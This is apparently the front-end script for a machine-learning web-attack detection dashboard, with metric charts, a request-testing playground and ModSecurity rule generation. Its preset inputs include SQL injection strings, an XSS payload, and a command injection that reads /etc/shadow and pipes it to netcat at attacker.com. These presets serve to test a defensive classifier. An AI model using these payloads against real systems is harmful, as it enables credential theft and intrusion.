document.addEventListener("DOMContentLoaded", () => {
  fetchEvalResults();
  setupPlaygroundListeners();
});

let rocChartInstance = null;
let distChartInstance = null;
let currentPredictionResult = null;

// Presets data
const PRESETS = {
  normalHome: { method: "GET", url: "/index.html", body: "" },
  normalSearch: { method: "GET", url: "/search?q=laptop&page=2&sort=asc", body: "" },
  sqliAuth: { method: "GET", url: "/login?user=admin' OR '1'='1' --", body: "" },
  sqliUnion: { method: "GET", url: "/products?category=1 UNION SELECT 1,username,password FROM users--", body: "" },
  xss: { method: "GET", url: "/search?q=<script>alert('XSS_ATTACK')</script>", body: "" },
  rce: { method: "GET", url: "/api/v1/exec?cmd=cat%20/etc/shadow%20|%20nc%20attacker.com%204444", body: "" }
};

async function fetchEvalResults() {
  try {
    const res = await fetch("/eval-results");
    if (!res.ok) throw new Error("Failed to fetch evaluation metrics");
    const data = await res.json();

    updateMetricsUI(data);
    renderRocChart(data.roc_curve, data.metrics.roc_auc);
    renderScoreDistributionChart(data.score_distribution);

    document.getElementById("statusBadge").textContent = "● ML API Connected";
    document.getElementById("statusBadge").classList.add("badge-pulse");
  } catch (err) {
    console.warn("Could not fetch /eval-results, using fallback metrics:", err);
    document.getElementById("statusBadge").textContent = "● Standalone Mode";
    document.getElementById("statusBadge").style.color = "#f59e0b";
  }
}

function updateMetricsUI(data) {
  const m = data.metrics;
  const cm = data.confusion_matrix;

  // Overview Cards
  document.getElementById("metricAccuracy").textContent = `${(m.accuracy * 100).toFixed(2)}%`;
  document.getElementById("metricRocAuc").textContent = m.roc_auc.toFixed(4);
  document.getElementById("metricBenignF1").textContent = `${(m.benign.f1_score * 100).toFixed(2)}%`;
  document.getElementById("metricBenignSub").textContent = `Precision: ${(m.benign.precision * 100).toFixed(1)}% | Recall: ${(m.benign.recall * 100).toFixed(1)}%`;
  document.getElementById("metricAttackF1").textContent = `${(m.attack.f1_score * 100).toFixed(2)}%`;
  document.getElementById("metricAttackSub").textContent = `Precision: ${(m.attack.precision * 100).toFixed(1)}% | Recall: ${(m.attack.recall * 100).toFixed(1)}%`;

  document.getElementById("chartAucVal").textContent = m.roc_auc.toFixed(4);

  // Confusion Matrix
  if (cm) {
    const totalBenign = cm.tn + cm.fp;
    const totalAttack = cm.fn + cm.tp;

    document.querySelector("#cmTN .cm-cell-num").textContent = cm.tn.toLocaleString();
    document.querySelector("#cmTN .cm-cell-pct").textContent = `${((cm.tn / totalBenign) * 100).toFixed(1)}% of Normal`;

    document.querySelector("#cmFP .cm-cell-num").textContent = cm.fp.toLocaleString();
    document.querySelector("#cmFP .cm-cell-pct").textContent = `${((cm.fp / totalBenign) * 100).toFixed(1)}% False Alarm`;

    document.querySelector("#cmFN .cm-cell-num").textContent = cm.fn.toLocaleString();
    document.querySelector("#cmFN .cm-cell-pct").textContent = `${((cm.fn / totalAttack) * 100).toFixed(1)}% Missed`;

    document.querySelector("#cmTP .cm-cell-num").textContent = cm.tp.toLocaleString();
    document.querySelector("#cmTP .cm-cell-pct").textContent = `${((cm.tp / totalAttack) * 100).toFixed(1)}% Blocked`;
  }
}

function renderRocChart(points, auc) {
  const ctx = document.getElementById("rocChart").getContext("2d");
  if (rocChartInstance) rocChartInstance.destroy();

  const fprData = points ? points.map(p => p.fpr) : [0, 0.05, 0.1, 0.2, 0.5, 1.0];
  const tprData = points ? points.map(p => p.tpr) : [0, 0.92, 0.96, 0.98, 0.99, 1.0];

  rocChartInstance = new Chart(ctx, {
    type: "line",
    data: {
      labels: fprData,
      datasets: [
        {
          label: `Random Forest ROC Curve (AUC = ${auc})`,
          data: tprData,
          borderColor: "#00f2fe",
          backgroundColor: "rgba(0, 242, 254, 0.15)",
          borderWidth: 3,
          fill: true,
          tension: 0.3,
          pointRadius: 2
        },
        {
          label: "Random Chance (AUC = 0.50)",
          data: [0, 0.2, 0.4, 0.6, 0.8, 1.0],
          borderColor: "rgba(255, 255, 255, 0.3)",
          borderWidth: 1.5,
          borderDash: [5, 5],
          pointRadius: 0,
          fill: false
        }
      ]
    },
    options: {
      responsive: true,
      maintainAspectRatio: false,
      scales: {
        x: {
          title: { display: true, text: "False Positive Rate (FPR)", color: "#94a3b8" },
          grid: { color: "rgba(255, 255, 255, 0.05)" },
          ticks: { color: "#94a3b8" }
        },
        y: {
          title: { display: true, text: "True Positive Rate (TPR)", color: "#94a3b8" },
          grid: { color: "rgba(255, 255, 255, 0.05)" },
          ticks: { color: "#94a3b8" }
        }
      },
      plugins: {
        legend: { labels: { color: "#f1f5f9", font: { size: 11 } } }
      }
    }
  });
}

function renderScoreDistributionChart(dist) {
  const ctx = document.getElementById("scoreDistChart").getContext("2d");
  if (distChartInstance) distChartInstance.destroy();

  const benignScores = dist ? dist.benign_scores : [];
  const attackScores = dist ? dist.attack_scores : [];

  const binLabels = ["<-0.10", "-0.10 to -0.05", "-0.05 to 0.00", "0.00 to 0.05", "0.05 to 0.10", "0.10 to 0.15", ">0.15"];

  const getBinCounts = (scores) => {
    const counts = new Array(binLabels.length).fill(0);
    scores.forEach(s => {
      if (s < -0.10) counts[0]++;
      else if (s < -0.05) counts[1]++;
      else if (s < 0.00) counts[2]++;
      else if (s < 0.05) counts[3]++;
      else if (s < 0.10) counts[4]++;
      else if (s < 0.15) counts[5]++;
      else counts[6]++;
    });
    return counts;
  };

  distChartInstance = new Chart(ctx, {
    type: "bar",
    data: {
      labels: binLabels,
      datasets: [
        {
          label: "Normal Traffic (Benign)",
          data: getBinCounts(benignScores),
          backgroundColor: "rgba(16, 185, 129, 0.7)",
          borderColor: "#10b981",
          borderWidth: 1
        },
        {
          label: "Attack Traffic (Malicious)",
          data: getBinCounts(attackScores),
          backgroundColor: "rgba(239, 68, 68, 0.7)",
          borderColor: "#ef4444",
          borderWidth: 1
        }
      ]
    },
    options: {
      responsive: true,
      maintainAspectRatio: false,
      scales: {
        x: {
          title: { display: true, text: "Isolation Forest Anomaly Score Ranges", color: "#94a3b8" },
          grid: { color: "rgba(255, 255, 255, 0.05)" },
          ticks: { color: "#94a3b8" }
        },
        y: {
          title: { display: true, text: "Sample Count", color: "#94a3b8" },
          grid: { color: "rgba(255, 255, 255, 0.05)" },
          ticks: { color: "#94a3b8" }
        }
      },
      plugins: {
        legend: { labels: { color: "#f1f5f9", font: { size: 11 } } }
      }
    }
  });
}

function setupPlaygroundListeners() {
  document.getElementById("presetNormalHome").addEventListener("click", () => applyPreset(PRESETS.normalHome));
  document.getElementById("presetNormalSearch").addEventListener("click", () => applyPreset(PRESETS.normalSearch));
  document.getElementById("presetSqliAuth").addEventListener("click", () => applyPreset(PRESETS.sqliAuth));
  document.getElementById("presetSqliUnion").addEventListener("click", () => applyPreset(PRESETS.sqliUnion));
  document.getElementById("presetXss").addEventListener("click", () => applyPreset(PRESETS.xss));
  document.getElementById("presetRce").addEventListener("click", () => applyPreset(PRESETS.rce));

  document.getElementById("btnPredict").addEventListener("click", runPrediction);
  document.getElementById("btnGenerateRule").addEventListener("click", runRuleGeneration);
}

function applyPreset(preset) {
  document.getElementById("reqMethod").value = preset.method;
  document.getElementById("reqUrl").value = preset.url;
  document.getElementById("reqBody").value = preset.body;
  runPrediction();
}

async function runPrediction() {
  const method = document.getElementById("reqMethod").value;
  const url = document.getElementById("reqUrl").value.trim();
  const body = document.getElementById("reqBody").value.trim();

  if (!url) {
    alert("กรุณากรอก Request URI / URL Path");
    return;
  }

  // Hide rule output box on new predict
  document.getElementById("ruleOutput").classList.add("hidden");

  const btn = document.getElementById("btnPredict");
  btn.textContent = "⏳ Analyzing Request...";
  btn.disabled = true;

  try {
    const response = await fetch("/predict", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ url, method, body })
    });

    if (!response.ok) throw new Error("API Predict failed");

    currentPredictionResult = await response.json();
    renderPredictionResult(currentPredictionResult);
  } catch (err) {
    console.error("Prediction error:", err);
    alert("เกิดข้อผิดพลาดในการเชื่อมต่อกับ ML Predict API");
  } finally {
    btn.textContent = "⚡ Run Hybrid Model Predict";
    btn.disabled = false;
  }
}

async function runRuleGeneration() {
  const method = document.getElementById("reqMethod").value;
  const url = document.getElementById("reqUrl").value.trim();
  const body = document.getElementById("reqBody").value.trim();

  const btn = document.getElementById("btnGenerateRule");
  btn.textContent = "⏳ Generating ModSecurity SecRule...";
  btn.disabled = true;

  try {
    const response = await fetch("/generate-rule", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        url: url,
        method: method,
        body: body,
        attack_type: "Web Attack Pattern"
      })
    });

    if (!response.ok) throw new Error("Rule generation failed");

    const result = await response.json();
    document.getElementById("ruleOutput").classList.remove("hidden");
    document.getElementById("ruleIdBadge").textContent = `Rule #${result.rule_id}`;
    document.getElementById("ruleCode").textContent = result.secrule_code;
  } catch (err) {
    console.error("Rule generation error:", err);
    alert("เกิดข้อผิดพลาดในการสร้างกฎ ModSecurity SecRule");
  } finally {
    btn.textContent = "⚙️ Auto Generate ModSecurity WAF SecRule";
    btn.disabled = false;
  }
}

function renderPredictionResult(res) {
  document.getElementById("resultPlaceholder").classList.add("hidden");
  const content = document.getElementById("resultContent");
  content.classList.remove("hidden");

  const banner = document.getElementById("predBanner");
  const icon = document.getElementById("predIcon");
  const status = document.getElementById("predStatus");
  const desc = document.getElementById("predDesc");
  const ruleBox = document.getElementById("autoRuleBox");

  if (res.is_anomaly) {
    banner.className = "prediction-banner banner-anomaly";
    icon.textContent = "🚨";
    status.textContent = "ANOMALY DETECTED (ATTACK)";
    desc.textContent = `โมเดล Random Forest คำนวณโอกาสเป็นภัยคุกคาม ${((res.attack_probability || 0.95) * 100).toFixed(1)}% (Confidence: ${res.confidence || '99.5%'})`;
    ruleBox.classList.remove("hidden");
  } else {
    banner.className = "prediction-banner banner-pass";
    icon.textContent = "✅";
    status.textContent = "PASS (NORMAL BENIGN)";
    desc.textContent = `คำขอสอดคล้องกับพฤติกรรมปกติ โอกาสเป็นภัยคุกคามเพียง ${((res.attack_probability || 0.05) * 100).toFixed(1)}%`;
    ruleBox.classList.add("hidden");
  }

  const prob = (res.attack_probability !== undefined) ? res.attack_probability : (res.is_anomaly ? 0.95 : 0.05);
  const isoScore = (res.anomaly_score !== undefined) ? res.anomaly_score : 0.0;

  document.getElementById("probVal").textContent = `${(prob * 100).toFixed(1)}%`;
  document.getElementById("scoreVal").textContent = isoScore.toFixed(4);
  document.getElementById("confidenceVal").textContent = `Confidence: ${res.confidence || '99%'} (Target > 92%)`;

  const gaugeFill = document.getElementById("gaugeFill");
  gaugeFill.style.width = `${prob * 100}%`;
  
  if (res.is_anomaly) {
    gaugeFill.style.background = "linear-gradient(90deg, #ef4444, #f59e0b)";
  } else {
    gaugeFill.style.background = "linear-gradient(90deg, #10b981, #00f2fe)";
  }

  // Render Feature Chips
  const chipsContainer = document.getElementById("featureChips");
  chipsContainer.innerHTML = "";

  const feat = res.features;
  for (const [key, val] of Object.entries(feat)) {
    const chip = document.createElement("div");
    chip.className = "chip";
    chip.innerHTML = `<span class="chip-key">${key}:</span><span class="chip-val">${val}</span>`;
    chipsContainer.appendChild(chip);
  }
}
